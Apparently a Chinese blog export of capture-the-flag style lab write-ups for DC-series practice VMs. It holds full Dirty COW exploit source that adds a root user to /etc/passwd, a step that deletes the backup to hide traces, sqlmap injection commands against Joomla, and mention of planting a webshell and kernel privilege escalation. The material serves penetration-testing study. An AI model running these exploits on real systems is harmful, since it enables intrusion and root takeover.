class="line">//</span><br><span class="line"></span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;sys/ptrace.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;crypt.h&gt;</span><br><span class="line"></span><br><span class="line">const char *filename = &quot;/etc/passwd&quot;;</span><br><span class="line">const char *backup_filename = &quot;/tmp/passwd.bak&quot;;</span><br><span class="line">const char *salt = &quot;firefart&quot;;</span><br><span class="line"></span><br><span class="line">int f;</span><br><span class="line">void *map;</span><br><span class="line">pid_t pid;</span><br><span class="line">pthread_t pth;</span><br><span class="line">struct stat st;</span><br><span class="line"></span><br><span class="line">struct Userinfo &#123;</span><br><span class="line">   char *username;</span><br><span class="line">   char *hash;</span><br><span class="line">   int user_id;</span><br><span class="line">   int group_id;</span><br><span class="line">   char *info;</span><br><span class="line">   char *home_dir;</span><br><span class="line">   char *shell;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">char *generate_password_hash(char *plaintext_pw) &#123;</span><br><span class="line">  return crypt(plaintext_pw, salt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char *generate_passwd_line(struct Userinfo u) &#123;</span><br><span class="line">  const char *format = &quot;%s:%s:%d:%d:%s:%s:%s\n&quot;;</span><br><span class="line">  int size = snprintf(NULL, 0, format, u.username, u.hash,</span><br><span class="line">    u.user_id, u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  char *ret = malloc(size + 1);</span><br><span class="line">  sprintf(ret, format, u.username, u.hash, u.user_id,</span><br><span class="line">    u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  return ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void *madviseThread(void *arg) &#123;</span><br><span class="line">  int i, c = 0;</span><br><span class="line">  for(i = 0; i &lt; 200000000; i++) &#123;</span><br><span class="line">    c += madvise(map, 100, MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;madvise %d\n\n&quot;, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int copy_file(const char *from, const char *to) &#123;</span><br><span class="line">  // check if target file already exists</span><br><span class="line">  if(access(to, F_OK) != -1) &#123;</span><br><span class="line">    printf(&quot;File %s already exists! Please delete it and run again\n&quot;,</span><br><span class="line">      to);</span><br><span class="line">    return -1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  char ch;</span><br><span class="line">  FILE *source, *target;</span><br><span class="line"></span><br><span class="line">  source = fopen(from, &quot;r&quot;);</span><br><span class="line">  if(source == NULL) &#123;</span><br><span class="line">    return -1;</span><br><span class="line">  &#125;</span><br><span class="line">  target = fopen(to, &quot;w&quot;);</span><br><span class="line">  if(target == NULL) &#123;</span><br><span class="line">     fclose(source);</span><br><span class="line">     return -1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  while((ch = fgetc(source)) != EOF) &#123;</span><br><span class="line">     fputc(ch, target);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  printf(&quot;%s successfully backed up to %s\n&quot;,</span><br><span class="line">    from, to);</span><br><span class="line"></span><br><span class="line">  fclose(source);</span><br><span class="line">  fclose(target);</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">  // backup file</span><br><span class="line">  int ret = copy_file(filename, backup_filename);</span><br><span class="line">  if (ret != 0) &#123;</span><br><span class="line">    exit(ret);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  struct Userinfo user;</span><br><span class="line">  // set values, change as needed</span><br><span class="line">  user.username = &quot;firefart&quot;;</span><br><span class="line">  user.user_id = 0;</span><br><span class="line">  user.group_id = 0;</span><br><span class="line">  user.info = &quot;pwned&quot;;</span><br><span class="line">  user.home_dir = &quot;/root&quot;;</span><br><span class="line">  user.shell = &quot;/bin/bash&quot;;</span><br><span class="line"></span><br><span class="line">  char *plaintext_pw;</span><br><span class="line"></span><br><span class="line">  if (argc &gt;= 2) &#123;</span><br><span class="line">    plaintext_pw = argv[1];</span><br><span class="line">    printf(&quot;Please enter the new password: %s\n&quot;, plaintext_pw);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    plaintext_pw = getpass(&quot;Please enter the new password: &quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  user.hash = generate_password_hash(plaintext_pw);</span><br><span class="line">  char *complete_passwd_line = generate_passwd_line(user);</span><br><span class="line">  printf(&quot;Complete line:\n%s\n&quot;, complete_passwd_line);</span><br><span class="line"></span><br><span class="line">  f = open(filename, O_RDONLY);</span><br><span class="line">  fstat(f, &amp;st);</span><br><span class="line">  map = mmap(NULL,</span><br><span class="line">             st.st_size + sizeof(long),</span><br><span class="line">             PROT_READ,</span><br><span class="line">             MAP_PRIVATE,</span><br><span class="line">             f,</span><br><span class="line">             0);</span><br><span class="line">  printf(&quot;mmap: %lx\n&quot;,(unsigned long)map);</span><br><span class="line">  pid = fork();</span><br><span class="line">  if(pid) &#123;</span><br><span class="line">    waitpid(pid, NULL, 0);</span><br><span class="line">    int u, i, o, c = 0;</span><br><span class="line">    int l=strlen(complete_passwd_line);</span><br><span class="line">    for(i = 0; i &lt; 10000/l; i++) &#123;</span><br><span class="line">      for(o = 0; o &lt; l; o++) &#123;</span><br><span class="line">        for(u = 0; u &lt; 10000; u++) &#123;</span><br><span class="line">          c += ptrace(PTRACE_POKETEXT,</span><br><span class="line">                      pid,</span><br><span class="line">                      map + o,</span><br><span class="line">                      *((long*)(complete_passwd_line + o)));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;ptrace %d\n&quot;,c);</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    pthread_create(&amp;pth,</span><br><span class="line">                   NULL,</span><br><span class="line">                   madviseThread,</span><br><span class="line">                   NULL);</span><br><span class="line">    ptrace(PTRACE_TRACEME);</span><br><span class="line">    kill(getpid(), SIGSTOP);</span><br><span class="line">    pthread_join(pth,NULL);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printf(&quot;Done! Check %s to see if the new user was created.\n&quot;, filename);</span><br><span class="line">  printf(&quot;You can log in with the username &#x27;%s&#x27; and the password &#x27;%s&#x27;.\n\n&quot;,</span><br><span class="line">    user.username, plaintext_pw);</span><br><span class="line">    printf(&quot;\nDON&#x27;T FORGET TO RESTORE! $ mv %s %s\n&quot;,</span><br><span class="line">    backup_filename, filename);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>保存成一个shell.c文件</p>
<p>上传到我们的服务器</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907155900947.png"
                      alt="image-20230907155900947"
                ></p>
<p>用gcc编译一下</p>
<p>命令：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -pthread c代码文件名 -o 输出文件名 -lcrypt</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907160505475.png"
                      alt="image-20230907160505475"
                ></p>
<p>执行编译后的程序</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907160922874.png"
                      alt="image-20230907160922874"
                ></p>
<p>输入密码</p>
<p>我们这里看一下etc&#x2F;passwd</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907161148341.png"
                      alt="image-20230907161148341"
                ></p>
<p>可以看到我们这里成功添加了一个firefart用户而且还是root权限</p>
<p>我们这里其实就是利用脏牛漏洞在etc&#x2F;passwd中添加了一个root用户</p>
<p>但是攻击者在利用脏牛漏洞时通常会创建一个备份文件，如 <code>/etc/passwd.bak</code>，用于保存原始的 <code>/etc/passwd</code> 文件内容</p>
<p>我们这里为了删除攻击痕迹，可以把这个文件删除掉</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907161444986.png"
                      alt="image-20230907161444986"
                ></p>
<p>上面我们通过脏牛漏洞成功添加了一个特权用户，并且有root权限</p>
<p>那么我们可以通过su切换到这个特权用户</p>
<p>密码是我们上面自己设的。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907161620764.png"
                      alt="image-20230907161620764"
                ></p>
<p>提权到root权限，那么到这里我们就拿下了这台服务器。</p>
]]></content>
      <tags>
        <tag>渗透-靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-3靶机打靶记录</title>
    <url>/2023/09/08/DC-3%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="DC-3靶机打靶记录"><a href="#DC-3靶机打靶记录" class="headerlink" title="DC-3靶机打靶记录"></a>DC-3靶机打靶记录</h1><h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><p>靶机下载地址：<a class="link"   href="https://www.vulnhub.com/entry/dc-32,312/" >https://www.vulnhub.com/entry/dc-32,312/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>下载得到是一个ova文件</p>
<p>我们这里直接导入就行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908200000681.png"
                      alt="image-20230908200000681"
                ></p>
<p>设置靶机名字和虚拟机存放位置</p>
<p>报错解决：</p>
<p>在我们启动靶机的时候可能会遇到这个报错：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">IDE设备(磁盘/CD-ROM)配置不正确。&quot;ide0:1&quot;上具有一个IDE从设备，</span><br><span class="line">但没有主设备。此配置在虚拟机中无法正常运行。</span><br><span class="line">请使用配置编辑器将磁盘/CD-ROM 从&quot;ide0:1&quot;移到&quot;ide0:0”。</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908200247081.png"
                      alt="image-20230908200247081"
                ></p>
<p>把这里按报错修改为0：0就行</p>
<p>然后就可以正常启动靶机</p>
<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>攻击机和靶机是在同一网段，所以我们这里可以使用arp协议来扫描存活主机</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908200530705.png"
                      alt="image-20230908200530705"
                ></p>
<p>可以扫描我们靶机的ip地址</p>
<p>或者使用nmap命令</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.113.0/24</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908201529638.png"
                      alt="image-20230908201529638"
                ></p>
<p>可以得到我们靶机的ip地址为192.168.113.147</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>我们已经得到了目标靶机的ip地址，接下来就是要扫描靶机开放了那些端口</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -T4 -O -p 0-65535 192.168.113.147</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908201709732.png"
                      alt="image-20230908201709732"
                ></p>
<p>根据扫描结果可以看到开放了一个80端口</p>
<h1 id="三、漏洞扫描挖掘与利用"><a href="#三、漏洞扫描挖掘与利用" class="headerlink" title="三、漏洞扫描挖掘与利用"></a>三、漏洞扫描挖掘与利用</h1><p>访问80端口的web服务</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908201925144.png"
                      alt="image-20230908201925144"
                ></p>
<p>访问主页面告诉了我们的目标，拿下服务器root权限</p>
<p>首页是一个登录页面</p>
<p>尝试弱口令登录没有成功</p>
<p>也不存在sql注入</p>
<p>用dirserach扫描目录文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.113.147/ </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908202310941.png"
                      alt="image-20230908202310941"
                ></p>
<p>发现扫描到了管理员后台</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908202351755.png"
                      alt="image-20230908202351755"
                ></p>
<p>访问后台是一个管理员登录页面</p>
<p>尝试弱口令字典爆破</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908202528547.png"
                      alt="image-20230908202528547"
                ></p>
<p>弱口令爆破失败</p>
<p>尝试使用sqlmap尝试登录页面是否存在sql注入</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908202751453.png"
                      alt="image-20230908202751453"
                ></p>
<p>不存在sql注入</p>
<p>我们观察这个后台登录页面发现使用的cms是joomla</p>
<p>但是我们并不知道版本号</p>
<p>获取版本号可以用joomla的专用扫描器 joomscan扫描</p>
<p>安装命令：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install joomscan</span><br></pre></td></tr></table></figure></div>

<p>使用命令：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">joomscan -u ip</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908203241480.png"
                      alt="image-20230908203241480"
                ></p>
<p>我们这里可以得到cms的版本号</p>
<p>使用searchsploit去漏洞库搜索一下看有没有该版本的漏洞</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit joomla 3.7.0</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908203525617.png"
                      alt="image-20230908203525617"
                ></p>
<p>可以看到在3.7.0的joomla中存在sql注入漏洞</p>
<p>把漏洞利用exp复制当前文件夹</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit -m 42033.txt</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908203717910.png"
                      alt="image-20230908203717910"
                ></p>
<p>exp中给了sqlmap的使用命令</p>
<p>这里直接使用sqlmap去进行漏洞利用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.113.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908203959594.png"
                      alt="image-20230908203959594"
                ></p>
<p>去爆破表</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.113.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -tables</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908204055600.png"
                      alt="image-20230908204055600"
                ></p>
<p>可以看到在表中有一个users表</p>
<p>尝试爆表中全部数据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.113.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &#x27;#__users&#x27; --dump list[fullordering]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908204418801.png"
                      alt="image-20230908204418801"
                ></p>
<p>获取到了账号 <code>admin</code>，密码 <code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></p>
<p>通过网上百度查询知道这个密码是Blowfish加密</p>
<p>这里使用john进行暴力破解</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908204755292.png"
                      alt="image-20230908204755292"
                ></p>
<p>经过解密我们可以得到密码为snoopy</p>
<p>所以我们这里可以得到管理员的账号密码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin：snoopy</span><br></pre></td></tr></table></figure></div>

<p>尝试登录后台</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205056490.png"
                     
                ></p>
<p>成功登录后台管理页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205218049.png"
                      alt="image-20230908205218049"
                ></p>
<p>在后台中我们可以修改模板页面的代码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205307778.png"
                      alt="image-20230908205307778"
                ></p>
<p>那我们可以尝试在模板页面中写入phpinfo看看是否可用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230908205403689.png"
                      alt="image-20230908205403689"
                ></p>
<p>访问修改的模板页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205554965.png"
                      alt="image-20230908205554965"
                ></p>
<p>可以看到成功利用了</p>
<p>那我们这里可以在模板页面中写入反弹shell代码，从而连接上服务器</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205652193.png"
                      alt="image-20230908205652193"
                ></p>
<p>或者直接写入一句话木马</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205710976.png"
                      alt="image-20230908205710976"
                ></p>
<p>尝试蚁剑连接</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205735037.png"
                      alt="image-20230908205735037"
                ></p>
<p>反弹shell</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205758952.png"
                      alt="image-20230908205758952"
                ></p>
<p>监听端口</p>
<p>访问我们修改的页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205841726.png"
                      alt="image-20230908205841726"
                ></p>
<p>反弹shell成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205857858.png"
                      alt="image-20230908205857858"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205913820.png"
                      alt="image-20230908205913820"
                ></p>
<p>可以看到我们当前是普通用户权限</p>
<p>查看liunx内核版本</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908210019246.png"
                      alt="image-20230908210019246"
                ></p>
<p>4.4的内核不能利用脏牛提权</p>
<p>尝试suid提权</p>
<p>查看有s权限的命令</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">find -perm -u=s -type f -exec ls -la &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908210223367.png"
                      alt="image-20230908210223367"
                ></p>
<p>没有有s权限的命令</p>
<p>那就只能看看有没有root权限的命令了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908210303889.png"
                      alt="image-20230908210303889"
                ></p>
<p>同样的也是没有</p>
<p>那这种情况下我们只能去通过searchsploit查找相应的liunx版本是否存在提权漏洞</p>
<p>那我们首先要先获取到系统的版本号和内核版本号</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/issue		//查看系统版本号</span><br><span class="line">uname -a			//查看内核版本号</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908210524256.png"
                      alt="image-20230908210524256"
                ></p>
<p>系统为 <code>ubuntu 16.04</code>，内核发行版本为 <code>4.4.0-21</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit ubuntu 16.04</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908210745836.png"
                      alt="image-20230908210745836"
                ></p>
<p>找到对应内核版本的漏洞</p>
<p>有三个漏洞可以利用</p>
<p>这里使用Linux Kernel 4.4.x (Ubuntu 16.04) - ‘double-fdput()’ bpf(BPF_PROG_LOAD) Privilege Escalation这个漏洞来打</p>
<p>同样的先把exp下载到kali上</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211034760.png"
                      alt="image-20230908211034760"
                ></p>
<p>打开可以看到exp的下载网址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211053135.png"
                      alt="image-20230908211053135"
                ></p>
<p>我们把exp下载下来，然后通过蚁剑传送到服务器上面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211156826.png"
                      alt="image-20230908211156826"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211221597.png"
                      alt="image-20230908211221597"
                ></p>
<p>解压exploit压缩包进行利用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211436246.png"
                      alt="image-20230908211436246"
                ></p>
<p>先执行 <code>complie.sh</code>，然后执行 <code>doubleput</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211653792.png"
                      alt="image-20230908211653792"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211714171.png"
                      alt="image-20230908211714171"
                ></p>
<p>这里显示已经提权成功</p>
<p>查看我们当前的权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211747289.png"
                      alt="image-20230908211747289"
                ></p>
<p>可以看到我们已经提升到了root权限</p>
<p>下面获取flag就行了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211833124.png"
                      alt="image-20230908211833124"
                ></p>
<h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>这台靶机相对来说比较简单，更多的是学习渗透的流程和工具的使用，在这个靶机中大多数利用的漏洞都是通过searchsploit在漏洞库中进行检索利用的。</p>
]]></content>
      <tags>
        <tag>渗透-靶机-DC系列</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-1靶机打靶记录</title>
    <url>/2023/09/09/DC-1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="一、靶机搭建"><a href="#一、靶机搭建" class="headerlink" title="一、靶机搭建"></a>一、靶机搭建</h1><p>靶机下载地址：<a class="link"   href="https://www.vulnhub.com/entry/dc-1,292/" >https://www.vulnhub.com/entry/dc-1,292/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>下载得到是一个ova文件</p>
<p>我们这里直接导入就行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908200000681.png"
                      alt="image-20230908200000681"
                ></p>
<p>设置靶机名字和虚拟机存放位置</p>
<p>然后直接启动虚拟机就可以了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909142915814.png"
                      alt="image-20230909142915814"
                ></p>
<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h2 id="靶机发现"><a href="#靶机发现" class="headerlink" title="靶机发现"></a>靶机发现</h2><p>因为目标靶机和我们的攻击机是在同一网段，我们这里直接扫描网段存活主机就行了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.113.0/24</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909143322829.png"
                      alt="image-20230909143322829"
                ></p>
<p>通过存活主机扫描可以得到我们的目标靶机的ip地址为192.168.113.148</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>扫描目标靶机开放的端口</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -T4 -O -p 0-65535 192.168.113.148</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909143555072.png"
                      alt="image-20230909143555072"
                ></p>
<p>可以看到开放了221端口和80端口</p>
<p>根据扫描结果我们可以看出开启了ssh服务和web服务</p>
<p>访问对应的web服务</p>
<h1 id="三、漏洞扫描与利用"><a href="#三、漏洞扫描与利用" class="headerlink" title="三、漏洞扫描与利用"></a>三、漏洞扫描与利用</h1><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909144813909.png"
                      alt="image-20230909144813909"
                ></p>
<p>主页面是一个登录页面</p>
<p>尝试管理员账号弱口令登录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908202528547.png"
                      alt="image-20230908202528547"
                ></p>
<p>没有爆出来密码</p>
<p>使用whatweb工具进行指纹识别</p>
